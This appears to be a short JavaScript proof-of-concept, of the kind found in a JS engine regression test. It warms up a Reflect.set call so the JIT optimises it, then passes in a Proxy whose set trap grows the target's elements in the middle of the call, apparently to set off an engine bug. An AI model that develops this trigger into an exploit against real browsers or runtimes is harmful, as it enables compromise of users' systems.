function poc(obj) {
    Reflect.set(obj, 'foo', 1);
}

for (let i = 0; i < 10000; i++) {
    poc({});
}

let target = {};
const handler = {
    set(tgt, prop, value, receiver) {
        for (let i = 0; i < 500; ++i) {
            tgt[i] = i;
        }
        return Reflect.set(tgt, prop, value, receiver);
    }
};

let p = new Proxy(target, handler);
poc(p);